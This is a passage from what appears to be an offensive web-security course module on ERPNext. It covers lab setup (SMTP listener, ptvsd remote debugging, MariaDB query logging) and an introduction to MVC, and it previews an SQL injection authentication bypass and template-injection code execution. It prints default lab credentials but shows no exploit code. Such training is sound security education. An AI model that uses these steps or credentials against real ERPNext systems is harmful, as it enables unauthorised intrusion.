This module covers two vulnerabilities that can be used to exploit ERPNext,[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_254-1) an open source Enterprise Resource Planning software built on the Frappe Web Framework.[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_254-2)

These vulnerabilities were originally discovered in Frappe, but we will leverage the feature set in ERPNext to exploit them. The first vulnerability we will discuss is a standard SQL injection including an in-depth analysis on how the vulnerability was discovered.

The SQL injection vulnerability will allow us to bypass authentication and access the Administrator console. With access to the Administrator console, we will examine a Server Side Template Injection[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_254-3) (SSTI) vulnerability in detail. We will leverage the SSTI vulnerability to achieve remote code execution. Finally, we'll wrap up by discussing how straying from the intended software design patterns can assist in vulnerability discovery.

1

(Frappe, 2020), [https://erpnext.com/](https://erpnext.com/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_254-1)

2

(Frappe, 2020), [https://frappe.io/frappe](https://frappe.io/frappe) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_254-2)

3

(Portswigger, 2015), [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_254-3)

## 5.1. Getting Started

In this module we will attack as an unauthenticated user and we will use a white-box approach. This means that we will be providing system and application credentials for debugging purposes.

Let's start by reverting the ERPNext virtual machine from the _Labs_ page, where the credentials for the ERPNext server and application accounts are located.

Let's begin by configuring our environment.

### 5.1.1. Configuring the SMTP Server

In this module, we'll need to be able to send emails as we attempt to bypass the password reset functionality. To do this, we will need to set Frappe to use our Kali machine as the SMTP server. We can log in to the ERPNext server via SSH to make the necessary changes.

```
kali@kali:~$ ssh frappe@192.168.121.123
frappe@192.168.121.123's password: 
...
 Please access ERPNext by going to http://localhost:8000 on the host system.
 The username is "Administrator" and password is "admin"

 Do consider donating at https://frappe.io/buy

 To update, login as
 username: frappe
 password: frappe
 cd frappe-bench
 bench update

frappe@ubuntu:~$ 
```

> Listing 1 - Logging in via SSH

Next, we need to edit site_config.json (found in frappe-bench/sites/site1.local/) to match the contents shown in Listing 2.

```
frappe@ubuntu:~$ cat frappe-bench/sites/site1.local/site_config.json 
{
 "db_name": "_1bd3e0294da19198",
 "db_password": "32ldabYvxQanK4jj",
 "db_type": "mariadb",
 "mail_server": "<YOUR KALI IP>",
 "use_ssl": 0,
 "mail_port": 25,
 "auto_email_id": "admin@randomdomain.com"
}
```

> Listing 2 - site_config.json for email server

At this point, ERPNext will send emails to our Kali system. However, we still need to configure Kali to listen for incoming SMTP connections. We can accomplish this using the Python _smtpd_ module and the -c DebuggingServer flag to discard the messages after the smtpd server receives them.

```
kali@kali:~$ sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

> Listing 3 - Starting SMTP server on Kali

Since we won't need to see the contents of the emails, we can run the smtpd server in the background by adding "&" at the end of the command.

With the smtpd server started, ERPNext will be able to conduct password resets.

#### Exercise

Configure the SMTP server in Kali and the ERPNext server.

### 5.1.2. Configuring Remote Debugging

We can use debugging to inspect available variables, follow the flow of code, and pause execution right before a crucial change. A debugger is essential when attempting to exploit SSTI vulnerabilities. We will be using Visual Studio Code[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_257-1) to debug the ERPNext application.

We can follow these steps to set up remote debugging:

1. Install Visual Studio Code.
2. Configure Frappe to debug.
3. Load the code into Visual Studio Code.
4. Configure Visual Studio Code to connect to the remote debugger.

We will download and install Visual Studio Code by visiting the following link in Kali:

```
https://code.visualstudio.com/docs/?dv=linux64_deb 
```

> Listing 4 - Download URL for Visual Studio Code

Next, we can use apt to install the .deb file.

```
kali@kali:~$ sudo apt install ~/Downloads/code_1.45.1-1589445302_amd64.deb
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Note, selecting 'code' instead of '~/Downloads/code_1.45.1-1589445302_amd64.deb'
...
```

> Listing 5 - Installing Visual Studio Code from the downloaded .deb

Once installed, we'll start Visual Studio Code and install the Python extension. We can do this by clicking on the _Extensions_ tab on the left navigation panel and searching for "python". To install the extension, we'll select _Install_ and wait for it to complete.

![Figure 1: Extensions Panel of Visual Studio Code](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/3beba98e5c48de2bd7de12fd014b2d25-erpnext_extensions_panel.png)

Figure 1: Extensions Panel of Visual Studio Code

The bench tool is designed to make installing, updating, and starting Frappe applications easier. We'll need to reconfigure the _bench_[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_257-2) Procfile and add a few lines of code to start Frappe and ERPNext with remote debugging enabled.

To reconfigure bench, let's return to the SSH session where we are logged in to the ERPNext server and install _ptvsd_.[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_257-3) The _ptvsd_ package is the Python Tools for Visual Studio debug server, which allows us to create a remote debugging connection. To install it, we can use the pip binary provided by bench to ensure that _ptvsd_ is available to Frappe.

```
frappe@ubuntu:~$ /home/frappe/frappe-bench/env/bin/pip install ptvsd
...
Successfully installed ptvsd-4.3.2
```

> Listing 6 - Installing ptvsd

Next, let's open up the Procfile and comment out the section that starts the web server. We will manually start the web server later, when debugging is enabled.

```
frappe@ubuntu:~$ cat /home/frappe/frappe-bench/Procfile 
redis_cache: redis-server config/redis_cache.conf
redis_socketio: redis-server config/redis_socketio.conf
redis_queue: redis-server config/redis_queue.conf
#web: bench serve --port 8000

socketio: /usr/bin/node apps/frappe/socketio.js

watch: bench watch

schedule: bench schedule
worker_short: bench worker --queue short --quiet
worker_long: bench worker --queue long --quiet
worker_default: bench worker --queue default --quiet
```

> Listing 7 - Updating the Procfile to not start the web server

Once _ptvsd_ is installed, we must reconfigure the application and use _ptvsd_ to open up a debugging port. We can do this by editing the following file:

```
/home/frappe/frappe-bench/apps/frappe/frappe/app.py
```

> Listing 8 - Location of app.py

When the "bench serve" command in Procfile is executed, the bench tool runs the app.py file. By editing this file, we can start the remote debugging port early in the application start up. The code in Listing 9 needs to be added below the "imports" in the app.py file.

```
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger")
ptvsd.wait_for_attach()
```

> Listing 9 - Code to start the debugger

The code above imports _ptvsd_ into the current project, starts the debugging server (ptvsd.enable_attach), prints a message, and pauses execution until a debugger is attached (ptvsd.wait_for_attach). By default, _ptvsd_ will start the debugger on port 5678.

Before we start the services and web server, we must transfer the entire source code of the application to Kali. This will allow us to use Visual Studio Code on Kali to remotely debug the ERPNext application. Let's use rsync to copy the folder to our machine.

```
kali@kali:~$ rsync -azP frappe@192.168.121.123:/home/frappe/frappe-bench ./
frappe@192.168.121.123's password: 
...
frappe-bench/sites/assets/css/web_form.css
        108,418 100%  221.50kB/s    0:00:00 (xfr#48027, to-chk=46/56097)
frappe-bench/sites/assets/js/
frappe-bench/sites/assets/js/bootstrap-4-web.min.js
        231,062 100%  371.13kB/s    0:00:00 (xfr#48028, to-chk=45/56097)
frappe-bench/sites/assets/js/bootstrap-4-web.min.js.map
        409,026 100%  536.16kB/s    0:00:00 (xfr#48029, to-chk=44/56097)
...
```

> Listing 10 - Transferring the zip file to Kali

Once the files are transferred, we'll open the folder in Visual Studio Code using _File_ > _Open Folder_. When the _Open Folder_ dialog appears, we'll navigate to the copied frappe-bench directory and click _OK_.

![Figure 2: Open Folder Dialog in Visual Studio Code](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/7dfeeb244383a9d476b5ab6820b0b96c-erpnext_opening_folder.png)

Figure 2: Open Folder Dialog in Visual Studio Code

At this point, we will find the folder structure on the left panel under _Explorer_.

![Figure 3: Visual Studio Code Explorer with Folder Structure](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/1b9b96bd1df8dd437c004ed58e18565b-erpnext_VSCode_explorer.png)

Figure 3: Visual Studio Code Explorer with Folder Structure

Now it's time to start up Frappe and ERPNext with the debugging port. Before we can start the web server, we'll need to start the necessary services. We can run 'bench start' to start _Redis_, the web server, the socket.io server, and all the other dependencies required by Frappe and ERPNext.

```
frappe@ubuntu:~$ cd /home/frappe/frappe-bench/

frappe@ubuntu:~/frappe-bench$ bench start
22:35:55 system           | worker_long.1 started (pid=6314)
22:35:55 system           | watch.1 started (pid=6313)
22:35:55 system           | schedule.1 started (pid=6315)
22:35:55 system           | redis_queue.1 started (pid=6316)
22:35:55 redis_queue.1    | 6326:M 27 Nov 22:35:55.391 * Increased maximum number of open files to 10032 (it was originally set to 1024).
...
```

> Listing 11 - Starting ERPNext using bench

Next, we will open up another SSH terminal and start the web server from the /home/frappe/frappe-bench/sites directory. We can use the python binary installed by bench to run the bench helper. The bench helper starts the Frappe web server on port 8000. We will pass in the --noreload argument, which disables the Web Server Gateway Interface[4](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_257-4) (werkzeug)[5](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_257-5) from auto-reloading. Finally, we can use --nothreading to disable multithreading.

We can also use _screen_ or _tmux_ instead of opening a new SSH connection.

```
frappe@ubuntu:~/frappe-bench$ cd /home/frappe/frappe-bench/sites

frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
```

> Listing 12 - Manually starting the web server

Now that the dependencies are running, the code base is open in Visual Studio Code, and the web application is awaiting a debugging connection, it's time to connect to the remote debugger. Our next step is to configure the connection information in Visual Studio Code for remote debugging.

Visual Studio Code does not initially present an option to debug a Python project. However, we can work around this by first opening an existing Python project. This can be done by visiting the _Explorer_ section of Visual Studio Code and clicking on any Python file. We'll use the same app.py file we modified earlier.

![Figure 4: app.py Open in Visual Studio Code](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/b2bf258d2a79f5c07542fe8b41880008-erpnext_apps_open_vscode.png)

Figure 4: app.py Open in Visual Studio Code

Next, we can select the _Debug_ panel on the left navigation panel of Visual Studio Code.

![Figure 5: Debug Panel Of Visual Studio Code](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/0f23b84f92a47db3b7c9701332e78f11-erpnext_debug_panel.png)

Figure 5: Debug Panel Of Visual Studio Code

With the debug panel open, we'll click _create a launch.json file_ at the top left.

Next, when the debug configuration prompt appears, we can select _Remote Attach_ and press I.

![Figure 6: Selecting Remote Attach](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/0ab9a49f4f2844e4f8fb5763aeddc549-erpnext_selecting_remote_attach.png)

Figure 6: Selecting Remote Attach

When the host name prompt appears, we'll input the IP address of the ERPNext host and press I.

![Figure 7: Selecting the Remote IP](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/fc40f39fff4eb788c05b2230cb0244f8-erpnext_select_remote_ip.png)

Figure 7: Selecting the Remote IP

Finally, when prompted, we'll enter port number 5678 into the _Remote Debugging_ port prompt and press I.

![Figure 8: Selecting the Remote Port](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/6213eee16fd8ddb9aefa81b4c1427601-erpnext_selecting_remote_port.png)

Figure 8: Selecting the Remote Port

Once we have completed the wizard, the configuration file will open. To complete the configuration, we'll set _remoteRoot_ to the server directory containing the application source code. This instructs the remote debugger to match up the folder open in Visual Studio Code (${workspaceFolder}) with the folder found on the remote host (/home/frappe/frappe-bench/). The final launch.json file should look like the one in Listing 13.

```
{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python: Remote Attach",
            "type": "python",
            "request": "attach",
            "port": 5678,
            "host": "<Your_ERPNext_IP>",
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "/home/frappe/frappe-bench/"
                }
            ]
        }
    ]
}
```

> Listing 13 - launch.json final configuration

Next, we can press C+s to save the file. When we're ready to start the web server with remote debugging, we'll enter % or click the green "play" button.

![Figure 9: Starting the Debugging Connection](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/5f6371ea3e513de3cf44f70a34bb3532-erpnext_start_debugging.png)

Figure 9: Starting the Debugging Connection

With the debugger connected, let's verify in the SSH console that the application is available on port 8000.

```
frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
 * Running on http://0.0.0.0:8000/ (Press CTRL+C to quit)
```

> Listing 14 - Web server showing a successful connection

The application is now running with remote debugging enabled. We can test this by setting a breakpoint, loading a page, and confirming that debugger reaches the breakpoint. Let's set it in apps/frappe/frappe/handler.py in the _handle_ function, which manages each request from the browser. We can place the breakpoint by clicking on the empty space to the left of the line number. A red dot will appear.

![Figure 10: Setting a breakpoint](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/dec47187f7498b00a742282202773384-erpnext_setting_breakpoint.png)

Figure 10: Setting a breakpoint

Next, we will load the application in our web browser by visiting the remote IP address on port 8000. The browser should pause as the page loads and line 15 is highlighted in Visual Studio Code.

![Figure 11: Pausing on Breakpoint](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/d0130095062a484b49ac5047ab8630b5-erpnext_pausing_on_breakpoint.png)

Figure 11: Pausing on Breakpoint

We can click the _Continue_ button to resume execution.

![Figure 12: Resume Execution](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/6afc28114a5e5833b1716291523634d7-erpnext_resume_execution.png)

Figure 12: Resume Execution

At this point, the page should load. Let's remove the breakpoint by clicking on the red dot.

#### Exercise

Configure remote debugging in Kali and the ERPNext server.

1

(Microsoft, 2020), [https://code.visualstudio.com/](https://code.visualstudio.com/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_257-1)

2

(Frappe, 2020), [https://github.com/frappe/bench#bench](https://github.com/frappe/bench#bench) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_257-2)

3

(Microsoft,2019), [https://github.com/microsoft/ptvsd](https://github.com/microsoft/ptvsd) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_257-3)

4

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface](https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_257-4)

5

(Pallets Projects, 2020), [https://palletsprojects.com/p/werkzeug/](https://palletsprojects.com/p/werkzeug/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_257-5)

### 5.1.3. Configuring MariaDB Query Logging

We can also configure database logging to make debugging the application easier. ERPNext uses MariaDB, an open source fork of MySQL, as its database. Configuring logging is identical to setting up logging in MySQL.

To configure logging, we will open a new SSH connection and edit the MariaDB server configuration file located at /etc/mysql/my.cnf, which is similar to a MySQL configuration file. With the file open, we will uncomment the following lines under the "Logging and Replication" section:

```
frappe@ubuntu:~$ sudo nano /etc/mysql/my.cnf

[mysqld]
...
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1
```

> Listing 15 - Editing the MySQL server configuration file to log all queries

After modifying the configuration file, we'll need to restart the MySQL server in order to apply the change.

```
frappe@ubuntu:~$ sudo systemctl restart mysql
```

> Listing 16 - Restarting the MySQL server to apply the new configuration

Next, we can use the tail command to follow the MariaDB logfile and inspect all queries being executed by the web application as they happen.

```
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log
   19 Init DB   _1bd3e0294da19198
   19 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
   19 Quit
   20 Connect   _1bd3e0294da19198@localhost as anonymous on 
   20 Query     SET AUTOCOMMIT = 0
   20 Init DB   _1bd3e0294da19198
   20 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
   20 Quit
   21 Connect   _1bd3e0294da19198@localhost as anonymous on 
   21 Query     SET AUTOCOMMIT = 0
   21 Init DB   _1bd3e0294da19198
   21 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
   21 Quit
   22 Connect   _1bd3e0294da19198@localhost as anonymous on 
   22 Query     SET AUTOCOMMIT = 0
   22 Init DB   _1bd3e0294da19198
   22 Query     select `value` from
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler'
...
```

> Listing 17 - Finding all queries being executed by ERPNext and Frappe

The log contains SQL queries, which indicates that the configuration is working as expected. If the queries are not showing up, with the ERPNext application running, the first troubleshooting step is to visit a page and navigate around. If queries still are not showing up, we can go back and review /etc/mysql/my.cnf to ensure that the _general_log_file_ and _general_log_ entries are properly set.

#### Exercise

Configure MariaDB logging in the ERPNext server.

## 5.2. Introduction to MVC, Metadata-Driven Architecture, and HTTP Routing

Before we start injecting SQL and popping shells, we should familiarize ourselves with the Model-View-Controller design pattern, Metadata-driven architecture, and HTTP routing. These concepts will teach us how to read the Frappe and ERPNext code and discover vulnerabilities within the code base.

### 5.2.1. Model-View-Controller Introduction

To introduce the concept of the Model-View-Controller design pattern, let's consider an old Point-of-Sale (PoS) system which is navigated with A and E+A.

A cashier uses an input device to key in purchases. The PoS system will then process the order, calculate the tax, and store it in a database. This system can also print an invoice as output. In mathematical terms, this input-process-output[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-1) process is known as a function machine.

![Figure 13: Input-Process-Ouput Machine](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/2c7803e327900410fe1bec009766fdb4-erpnext_ipo_diagram.png)

Figure 13: Input-Process-Ouput Machine

While the example above might not be difficult to program, once we start adding in different product types and taxing systems, hundreds of stores, and thousands of users, the application starts to get daunting and might result in "spaghetti code". Spaghetti code is source code that is unstructured and difficult to maintain.[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-2)

To prevent spaghetti code, the Model-View-Controller (MVC) software design pattern was created by Trygve Reenskaug in 1979.[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-3) Reenskaug said "MVC was conceived as a general solution to the problem of users controlling a large and complex data set" and it is used to "bridge the gap between the human user's mental model and the digital model that exists in the computer."[4](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-4)

The MVC software design pattern helps organize project code to increase reusability.[5](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-5) From a security perspective, the benefit of increased reusability is that the code only has to be written securely once. For example, if a developer manually interacts with an SQL database, they may inadvertently (and insecurely) concatenate the SQL statement with client-provided data, resulting in SQL injection. Instead, in an MVC architecture, the data is pulled once from a central location and reused throughout the application.

As the name suggests, the MVC design pattern is separated into three components: the model, the view, and the controller.

In the context of a web application, the _controller_ handles the input received from the user. This could be in the form of a HTTP route (i.e /user/update) or via a parameter (i.e. /me?action=update). Regardless of the input method, the controller maps the user's input to the function(s) that will be executed.[3:1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-3) Any user input logic is handled by the controller.[6](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-6)

The _model_ in Model-View-Controller maps data to a specific object and defines the logic that is needed to process the data.[7](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-7) The model is the central component of "bridg[ing] the gap between the human user's mental model and the digital model".[4:1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-4) A user object or a product object is an example of a model. A model object's variables will commonly match the columns found in a database table.[8](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-8)

The _view_ is the final output that is provided to the user. In the context of a web application, this can be the HTML, XML, or any other final representation that is provided to the user to be consumed.[9](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-9) Web frameworks will typically provide the option of using a templating engine to render data provided from the model to the user. We will get into more details of a templating engine later in this module.

To put it all together,

1. The user interacts with a website's view and the interaction is sent as a request to the controller.
2. The controller parses the user's interaction and requests the data from the model.
3. The model provides the requested data.
4. The controller renders a view using the provided data and responds back to the user.

This cycle continues as long as the user is interacting with the web application.

![Figure 14: MVC Interaction](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/dae9463eb1640d4aab73af87fe9ff381-erpnext_mvc_interaction1.png)

Figure 14: MVC Interaction

One very important thing to note is that MVC was not originally intended for web applications. Instead, as MVC rose in popularity for GUI applications, web applications started to adopt it.[3:2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-3) However, there are endless debates on how to properly adopt MVC for web applications since the boundaries for model, view, and controller are not strictly enforceable. This confusion can lead to vulnerabilities in modern web applications.

The Frappe framework and ERPNext application follow the MVC design pattern in some components.[10](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-10) Below is a quote from Frappe's _DocType_[11](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-11) documentation:

DocType is the basic building block of an application and encompasses all the three elements i.e. model, view and controller. It represents a:

Table in the database Form in the application Controller (class) to execute business logic

While this documentation explains that a DocType contains a Model (table in the database), View (Form in the application), and Controller, it also talks about a DocType as a building block of an application and not the entirety of the application itself. This means that Frappe is using MVC in DocTypes but also suggests that MVC is not used at lower levels of the application. To further understand this, we can look at how Frappe defines DocTypes,[12](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_260-12) or generic objects containing metadata that describe how Frappe handles data:

A DocType is the core building block of any application based on the Frappe Framework. It describes the Model and the View of your data. It contains what fields are stored for your data, and how they behave with respect to each other. It contains information about how your data is named. It also enables rich Object Relational Mapper (ORM) pattern...

The use of a DocType in this way suggests that Frappe follows a low-level, metadata-driven pattern that applies some principles of MVC. Certain vulnerabilities stem from developers not following an implemented pattern. To learn how to discover these types of vulnerabilities, we should further discuss metadata-driven patterns.

1

(Ootips, 1998), [http://ootips.org/mvc-pattern.html](http://ootips.org/mvc-pattern.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-1)

2

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/Spaghetti_code](https://en.wikipedia.org/wiki/Spaghetti_code) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-2)

3

(Norfolk, 2015), [https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667](https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-3) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-3:1) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-3:2)

4

(Reenskaug, 1979), [http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html](http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-4) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-4:1)

5

(Apple, 2018), [https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html](https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-5)

6

(Reenskaug, 1979), [http://heim.ifi.uio.no/~trygver/1979/mvc-2/1979-12-MVC.pdf](http://heim.ifi.uio.no/~trygver/1979/mvc-2/1979-12-MVC.pdf) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-6)

7

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Model–view–controller](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-7)

8

(Laravel, 2020), [https://laravel.com/docs/5.0/eloquent](https://laravel.com/docs/5.0/eloquent) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-8)

9

(CakePHP, 2020), [https://book.cakephp.org/2/en/cakephp-overview/understanding-model-view-controller.html](https://book.cakephp.org/2/en/cakephp-overview/understanding-model-view-controller.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-9)

10

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/ERPNext#Architecture](https://en.wikipedia.org/wiki/ERPNext#Architecture) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-10)

11

(Github, 2014), [https://github.com/frappe/frappe/blob/develop/frappe/core/doctype/doctype/README.md](https://github.com/frappe/frappe/blob/develop/frappe/core/doctype/doctype/README.md) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-11)

12

(Frappe, 2020), [https://frappe.io/docs/user/en/understanding-doctypes](https://frappe.io/docs/user/en/understanding-doctypes) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_260-12)

### 5.2.2. Metadata-driven Design Patterns

A metadata-driven design pattern creates a layer of abstraction that eases the new application development process. This works well for generic database-driven applications[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-1) like ERP software that allows users to customize stored data.

Salesforce[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-2) is big proponent of a metadata-driven design as their use case enables multiple customers to have a customized version of their application suite.

